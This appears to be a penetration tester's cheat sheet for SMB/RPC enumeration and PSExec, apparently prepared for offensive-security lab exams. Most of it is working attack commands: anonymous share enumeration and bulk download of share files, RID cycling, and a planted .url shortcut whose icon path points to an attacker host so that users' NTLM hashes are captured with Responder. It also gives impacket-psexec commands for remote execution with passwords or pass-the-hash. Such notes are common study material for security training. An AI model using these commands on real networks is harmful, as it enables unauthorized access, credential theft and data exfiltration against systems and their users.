# RPC/SMB

- try null logins (anonymous logins)
- credentials can sometimes be re-used or repeat credentials set (eg. ftp:ftp, admin:admin, smb:smb)
- can you upload files? maybe a URI attack? 

```bash
smbclient -N -L \\<target ip>\ # you should always consider using this. sometimes nxc and enum4linux-ng doesnt work properly

smb> recurse
smb> prompt off
smb>mget * 

# alternative smbclient one liner to recursive download
smbclient //<ip>/<share> -U <domain>/<user> -c 'prompt OFF;recurse ON;mget *'

# OR my preferred method
nxc smb <target ip> -u '' -p '' --shares

# if can access, use the spider module

nxc smb <target ip> -u '' -p '' --spider <share name> --regex .

# to list all readable files

nxc smb <target ip> -u '' -p '' -M spider_plus

#add -o DOWNLOAD_FLAG=True to download all files

enum4linux-ng -A <targetip> -R # the new enum4linux does not do RID cycling by default and thus can miss out users. add the -R to get RID cycling!

# if you can upload files, try running responder and then do this

upload any file there # you might get hash here

# if nothing happens, try this

create a file (name it as offsec.url for example)

# inside that file
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\<attacker ip>\%USERNAME%.icon
IconIndex=1

# upload offsec.url into the share
If this works you should see the username and hash (might need to wait a while)

```
- if not, wait till you have some creds and try again
- If you get a share name that looks unique, it could be a potential directory on a HTTP server (i.e. the Shenzi box)

# PSExec

If you happen to have some credentials, PSExec might sometimes work - usually requires sufficient privileges/rights be be able to write into shared folders (mainly C$ or ADMIN$).

Can also be used with pass the hash techniques

```bash
# remember to escape special characters if required
impacket-psexec <user>:<password>@<ip>

# pass the hash requires the full NTLM hash
impacket-psexec <user>@<ip> -hashes LM:NT

# if only the NT hash exists
impacket-psexec <user>@<ip> -hashes :NT
```
